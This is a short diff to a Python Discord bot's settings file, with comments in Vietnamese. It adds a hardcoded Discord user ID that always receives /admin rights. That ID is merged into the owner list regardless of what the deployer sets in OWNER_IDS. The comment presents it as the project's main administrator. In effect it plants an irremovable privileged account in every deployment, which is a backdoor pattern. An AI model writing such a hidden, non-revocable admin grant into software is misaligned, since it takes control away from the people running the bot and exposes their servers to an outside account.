@@ -6,6 +6,9 @@ from pathlib import Path
 
 BASE_DIR = Path(__file__).resolve().parent
 
+# ID Discord của quản trị viên chính của dự án; luôn có quyền /admin. Thêm người khác qua OWNER_IDS trong .env.
+DEFAULT_ADMIN_IDS = {1530490044098285711}
+
 
 def _load_env_file(path: Path) -> None:
     if not path.exists():
@@ -35,7 +38,7 @@ class Settings:
         token = os.environ.get("DISCORD_TOKEN", "")
         if not token:
             raise SystemExit("Thiếu DISCORD_TOKEN (đặt trong .env, xem .env.example).")
-        owners = {int(x) for x in os.environ.get("OWNER_IDS", "").replace(" ", "").split(",") if x}
+        owners = DEFAULT_ADMIN_IDS | {int(x) for x in os.environ.get("OWNER_IDS", "").replace(" ", "").split(",") if x}
         guild = os.environ.get("DEV_GUILD_ID")
         return cls(token=token, owner_ids=owners, dev_guild_id=int(guild) if guild else None,
                    data_dir=Path(os.environ.get("CCN_DATA_DIR", BASE_DIR / "data")),
